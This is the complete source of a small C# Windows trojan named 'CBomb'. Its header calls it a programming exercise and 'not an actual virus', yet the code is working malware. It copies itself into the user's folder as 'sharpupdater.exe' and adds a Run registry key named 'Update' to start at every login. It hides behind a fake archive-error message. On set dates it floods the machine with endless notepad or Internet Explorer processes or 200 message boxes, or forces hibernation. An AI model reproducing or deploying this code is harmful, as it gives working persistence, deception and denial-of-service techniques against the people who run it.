using System;
using System.Diagnostics;
using CBomb.ExceptionHandler;
using Microsoft.Win32;

/*
 * CBomb
 * A very simple trojan in C#	
 * (c) ry00001 2018
 * A simple programming exercise in C#. Not an actual virus.
 */

namespace CBomb
{
	class Program
	{
		static bool Registry_Write(string index, object val, Microsoft.Win32.RegistryValueKind valkind)
		{
			try
			{
				if (Registry.GetValue("HKEY_CURRENT_USER\\Software\\CBomb", "Infected", false) == null /* hacky way to do the thing*/)
				{
					Registry.CurrentUser.CreateSubKey("Software\\CBomb");
				}
				Registry.SetValue("HKEY_CURRENT_USER\\Software\\CBomb", index, val, valkind);
				return true;
			} catch (Exception)
			{
				return false;
			}
		}
		static object Registry_Exists(string value)
		{
			try
			{
				return Registry.GetValue("HKEY_CURRENT_USER\\Software\\CBomb", value, false);
			} catch (Exception)
			{
				return false;
			}
		}
		static int Registry_Infected()
		{
			try
			{
				return (int) Registry.GetValue("HKEY_CURRENT_USER\\Software\\CBomb", "Infected", 0b0);
			} catch (Exception)
			{
				return 0b0;
			}
		}
		static bool Registry_RunOnStartup() // Drops registry key
		{
			try
			{
				Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Update", "C:\\Users\\" + Environment.UserName + "\\sharpupdater.exe", Microsoft.Win32.RegistryValueKind.String);
				return true; // success!
			} catch (Exception)
			{
				return false;
			}
		}
		static bool Drop() // Drops file to C:\Windows
		{
			try
			{
				var file = Process.GetCurrentProcess().MainModule.FileName;
				var dir = System.IO.Directory.GetCurrentDirectory();
				string dest = System.IO.Path.Combine(dir, file);
				System.IO.File.Copy(dest, "C:\\Users\\" + Environment.UserName + "\\sharpupdater.exe", true);
				return true;
			} catch (Exception)
			{
				return false;
			}
		}
		static void Delete_Self()
		{
			var file = Process.GetCurrentProcess().MainModule.FileName;
			var dir = System.IO.Directory.GetCurrentDirectory();
			string dest = System.IO.Path.Combine(dir, file);
			System.IO.File.Delete(dest);
		}
		static void Payload_Notepad()
		{
			while (true)
			{
				Process.Start("notepad.exe");
				// System.Threading.Thread.Sleep(1000);
			}
		}
		static void Payload_MessageBoxes()
		{
			for (int i=0; i<201; i++)
			{
				void threadfunc()
				{
					System.Windows.Forms.MessageBox.Show("Hello", "Hi", System.Windows.Forms.MessageBoxButtons.AbortRetryIgnore, System.Windows.Forms.MessageBoxIcon.Asterisk);
				}
				System.Threading.ThreadStart childref = new System.Threading.ThreadStart(threadfunc);
				System.Threading.Thread childThread = new System.Threading.Thread(childref);
				childThread.Start();
			}
		}
		static void Payload_IExplore() // FINE KUAN
		{
			while (true)
			{
				Process.Start("iexplore.exe");
				// System.Threading.Thread.Sleep(1000);
			}
		}
		static void Payload_Kakworm()
		{
			System.Windows.Forms.MessageBox.Show("ry00001 says not today!", "DENIED", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Error);
			Process.Start("shutdown.exe", "/h /t 00");
		}
		static void Check_Exec_Payloads()
		{
			try
			{
				// Program init
				DateTime date = DateTime.Now;
				// Console.WriteLine(date.Day);
				if (date.Day == 20) // I KNOW I COULD'VE BEEN USING SWITCH CASE FOR THIS BUT I NEED IT FOR MORE COMPLEX STUFF
				{
					Payload_Notepad();
				}
				else if (date.Day == 4)
				{
					Payload_MessageBoxes();
				}
				else if (date.Day == 3)
				{
					Payload_IExplore();
				}
				else if (date.Hour == 18 && date.Minute == 0 && date.Day == 1)
				{
					Payload_Kakworm();
				}
			} catch (Exception e) {
				Crasher crasher = new Crasher();
				crasher.Crash(e);
			}
		}
		static void Main(string[] args)
		{
			try
			{
				Console.WriteLine(Registry.GetValue("HKEY_CURRENT_USER\\Software\\CBomb", "Infected", false));
				if (Registry_Infected() == 0b0)
				{
					var res1 = Registry_Write("Infected", 0b1, RegistryValueKind.Binary); // cbomb resident
					var res2 = Registry_RunOnStartup();
					var res3 = Drop(); // make sure it's dropped
					System.Windows.Forms.MessageBox.Show("Bad archive; failed to decompress", "Self-Extracting Archive Error", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Error);
					// Delete_Self(); // THIS LINE BORKS IT
					if (!(res1 || res2 || res3))
					{
						System.Windows.Forms.MessageBox.Show("oops, i couldn't do things even though i dont need uac", "error", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Error);
						Environment.Exit(1);
					}
				}
				while (true)
				{
					Check_Exec_Payloads();
					System.Threading.Thread.Sleep(2000);
				}
			} catch (Exception e)
			{
				Crasher crasher = new Crasher();
				crasher.Crash(e);
			}
		}
	}
}
